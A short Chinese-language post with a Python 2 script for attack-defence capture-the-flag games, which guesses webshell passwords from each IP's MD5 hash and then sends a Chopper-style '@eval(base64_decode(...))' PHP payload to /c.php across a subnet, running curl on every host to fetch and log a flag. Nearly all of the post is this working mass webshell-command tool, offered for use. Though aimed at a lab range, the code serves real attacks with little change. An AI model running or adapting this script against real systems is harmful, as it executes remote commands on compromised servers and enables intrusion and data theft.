脚本使用对象：
一个c段攻防环境，靶机的漏洞都相同，拿到shell后，想批量get flag的人。
代码一共两个功能，一个产生shell密码的【ip地址的md5前八位】，一个是批量get flag的【借鉴了菜刀的原理】。
#coding: utf-8
import urllib
import urllib2
from hashlib import md5
import base64

s0='@eval(base64_decode($_POST[z0]));'
s1='''
$cmdstr="curl [url]http://10.10.10.1/flag.html[/url]";   
exec($cmdstr,$getkey);
echo var_dump($getkey);
'''
s1=base64.b64encode(s1)
subip='192.168.126'          #config: ip subnet
ip_start=130                 #config: sub ip start
ip_end=140                   #config: sub ip end
shellpath='/c.php'           #config: shell file path


def get_shellpass(shellip):
        s=''
        for i in range(ip_start,ip_end):
                ip=shellip+'.'+str(i)
                password=md5(ip).hexdigest()[0:8]    
                print 'ip: '+ip+' | '+'password: '+password
                
                
def get_flag(flagip,flagpath):
        s=''
        for i in range(ip_start,ip_end):
                ip=flagip+'.'+str(i)
                password=md5(ip).hexdigest()[0:8]
                postdata = password+'='+s0+'&z0='+s1
                #print postdata
                url='http://'+ip+flagpath
                try:
                        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor()) 
                        f = opener.open(url, postdata,timeout=0.5)  
                        #f=urllib2.urlopen(url,timeout=0.5)
                        ftext=f.read()
                        if f.getcode()==404:
                                continue
                        elif f.text=='':
                                continue
                        else:
                                print '[+] '+ip+': Success!'
                                s=s+'ip:'+ip+' '+ftext+'\r\n'
                                continue
                except urllib2.URLError, e:
                        print '[-] '+ip+': Host can not connect.'
                        continue
        re_file=open('log.txt','w+')    # write to file
        re_file.write(s)

        
def main():
        print '''\r\n-------------------{Shell Password}-----------------\r\n'''
        get_shellpass(subip)
        print '''\r\n-------------------{Get Flag}-----------------------\r\n'''
        get_flag(subip,shellpath)
        
        
if __name__=='__main__':
        main()